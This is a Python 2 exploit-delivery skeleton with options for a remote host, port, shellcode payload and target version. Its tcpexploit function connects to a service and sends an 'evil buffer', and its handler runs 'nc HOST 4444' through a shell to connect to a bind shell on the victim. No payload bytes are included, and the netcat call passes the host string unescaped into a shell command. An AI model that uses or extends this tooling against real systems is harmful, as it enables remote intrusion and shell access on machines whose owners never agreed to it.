import argparse
import random
import requests
import socket
import string
import sys

def randomstring(length):
    return "".join(random.choice(string.ascii_lowercase) for i in range(length))

def handler( HOST, PAYLOAD ):
    if PAYLOAD == 'win32bind' or PAYLOAD == 'win32prebind':
        import subprocess, time
        subprocess.call('nc %s 4444' % HOST, shell=True )

def bannerchecktest( HOST, PORT):#, BANNER ):
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(( HOST, PORT ))
        data = s.recv(1024)
        s.close()
        #print data
        #if BANNER in data:
        #    return True
        #else:
        return data#False
    except Exception as error:
        print error
        sys.exit()

def tcpexploit( HOST, PORT, SPLOITSTRING ):
    print "Connecting to %s on port %s" % ( HOST, PORT )
    try:
        s=socket.socket( socket.AF_INET, socket.SOCK_STREAM )
        s.connect(( HOST, PORT ))
        s.recv( 1024 )
        print "Sending evil buffer"
        s.send( SPLOITSTRING )
        s.close()
        return True

    except Exception as error:
        print error
        return False

def arguments():
    parser = argparse.ArgumentParser(add_help=True,
            epilog='Example: %s --rhost 192.168.56.101 --target 0 --payload \
            win32bind' % sys.argv[0])
    parser.add_argument('--rhost', dest='RHOST', help='Target IP / Hostname')
    parser.add_argument('--port', dest='PORT', help='Target service port')
    parser.add_argument('--payload', dest='PAYLOAD', help='Shellcode to use')
    parser.add_argument('--force', action='store_true', help='Ignore all checks\
            and send the exploit')
    parser.add_argument('--check', action='store_true', help='Do not exploit\
            vulnerable target')
    parser.add_argument('--targets', action='store_true', help='Print available\
            targets')
    parser.add_argument('--target', dest='TARGET', help='Set the target \
            version')

    return parser

